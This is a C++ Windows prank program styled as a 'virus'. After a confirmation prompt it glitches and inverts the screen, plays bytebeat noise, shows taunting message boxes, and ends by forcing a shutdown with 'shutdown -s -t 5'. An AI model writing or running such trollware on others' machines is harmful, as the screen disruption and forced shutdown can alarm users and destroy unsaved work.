#include <Windows.h>
#include <stdio.h>
#include <iostream>
#include <mmsystem.h>
#include <chrono>
#include <thread>
#include <tchar.h>
#include <processthreadsapi.h>
#pragma comment(lib, "Winmm.lib")

void slideScreen(HDC hdc, int y, int x, int sw, int sh) {
	BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, y, x, hdc, 0, 0, SRCCOPY);
	BitBlt(hdc, rand() % 10 - 20, rand() % 20 - 10, sw, sh, hdc, 0, 0, SRCCOPY);
	return;
}

void corruptColors(HDC hdc, int y, int x, int sw, int sh) {
	BitBlt(hdc, rand() % 5 - 10, rand() % 10 - 5, y + rand() % 20 - 50, x + rand() % 20 - 50, hdc, 0, 0, SRCINVERT);
	BitBlt(hdc, rand() % 5 - 10, rand() % 10 - 5, sw + rand() % 20 - 50, sh + rand() % 20 - 50, hdc, 0, 0, SRCINVERT);
	return;
}

void invertColors(HDC hdc, int y, int x) {
	Sleep(500);
	PatBlt(hdc, 0, 0, y, x, PATINVERT);
	Sleep(500);
}


void Bytebeat() {
	HWAVEOUT hwout = 0;
	WAVEFORMATEX wformx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwout, WAVE_MAPPER, &wformx, 0, 0, CALLBACK_NULL);

	char buffer[8000 * 30];
	for(DWORD t = 0; t < sizeof(buffer); t++){
		buffer[t] = static_cast<char>((t >> 2) * (t >> (t / 300) | 19));
	}

	WAVEHDR hdr = { buffer, sizeof(buffer),0,0,0,0,0,0 };
	waveOutPrepareHeader(hwout, &hdr, sizeof(WAVEHDR));
	waveOutWrite(hwout, &hdr, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwout, &hdr, sizeof(WAVEHDR));
	waveOutClose(hwout);
}

void Bytebeat1() {
	HWAVEOUT hwout1 = 0;
	WAVEFORMATEX wformx1 = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwout1, WAVE_MAPPER, &wformx1, 0, 0, CALLBACK_NULL);

	char buffer1[8000 * 15];
	for (DWORD t = 0; t < sizeof(buffer1); t++) {
		buffer1[t] = static_cast<char>(t * (t >> 39));
	}

	WAVEHDR hdr1 = { buffer1, sizeof(buffer1),0,0,0,0,0,0 };
	waveOutPrepareHeader(hwout1, &hdr1, sizeof(WAVEHDR));
	waveOutWrite(hwout1, &hdr1, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwout1, &hdr1, sizeof(WAVEHDR));
	waveOutClose(hwout1);
}

void Bytebeat2() {
	HWAVEOUT hwout2 = 0;
	WAVEFORMATEX wformx2 = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
	waveOutOpen(&hwout2, WAVE_MAPPER, &wformx2, 0, 0, CALLBACK_NULL);

	char buffer2[8000 * 10];
	for (DWORD t = 0; t < sizeof(buffer2); t++) {
		buffer2[t] = static_cast<char>(2 * t * (t & 16384 ? 6 : 5) * (4 - (3 & t >> 8)) >> (3 & t - t - t >> (t & 4096 ? 2 : 15)));
	}

	WAVEHDR hdr2 = { buffer2, sizeof(buffer2),0,0,0,0,0,0 };
	waveOutPrepareHeader(hwout2, &hdr2, sizeof(WAVEHDR));
	waveOutWrite(hwout2, &hdr2, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hwout2, &hdr2, sizeof(WAVEHDR));
	waveOutClose(hwout2);
}

void payload1(HDC hdc, int y, int x, int sw, int sh) {
	auto t_end = std::chrono::steady_clock::now() + std::chrono::seconds(15);
	while (std::chrono::steady_clock::now() < t_end) {
		std::this_thread::sleep_for(std::chrono::milliseconds(10)); // Sleep to prevent busy waiting
		corruptColors(hdc, y, x, sw, sh);
	}
}

void payload2(HDC hdc, int y, int x, int sw, int sh) {
	auto t_end = std::chrono::steady_clock::now() + std::chrono::seconds(10);
	while (std::chrono::steady_clock::now() < t_end) {
		std::this_thread::sleep_for(std::chrono::milliseconds(10)); // Sleep to prevent busy waiting
		invertColors(hdc, y, x);
	}
}

void Mayhem(HDC hdc, int y, int x, int sw, int sh) {
	Bytebeat();
	auto t_end = std::chrono::steady_clock::now() + std::chrono::seconds(30);
	while (std::chrono::steady_clock::now() < t_end) {
		std::this_thread::sleep_for(std::chrono::milliseconds(10)); // Sleep to prevent busy waiting
		slideScreen(hdc, y, x, sw, sh);
	}

	MessageBox(NULL, TEXT("DuAmEYOrODoE,natoThKW!"), TEXT("Rehehehe"), MB_OK);

	Bytebeat1();

	payload1(hdc,y,x,sw,sh);

	Bytebeat2();

	payload2(hdc, y, x, sw, sh);
	

	MessageBox(NULL, TEXT("Well, you're fucked..."), TEXT("Thy painfull end..."), MB_OK);

	system("shutdown -s -t 5");
	MessageBox(NULL, TEXT("Farewell..."), NULL, MB_OK);

}


int main() {
	HDC hdc = GetDC(0);

	int x = 192000;
	int y = 108000;
	//this is for it to jump on all monitors, will be useful later as the getsystemmetrics() is broken on the x and y
	int sw = GetSystemMetrics(0); // this somehow works?
	int sh = GetSystemMetrics(0); // this somehow works too?
	if (MessageBoxA(NULL, "Are you sure you want to run this non-harmless virus?\nNo harm will happen aside you waiting 5+ minutes...", "Confirmation", MB_YESNO) == IDYES)
	{
		Mayhem(hdc,y,x,sw,sh);
	}
	else
	{
		exit(0);
	}
	
}
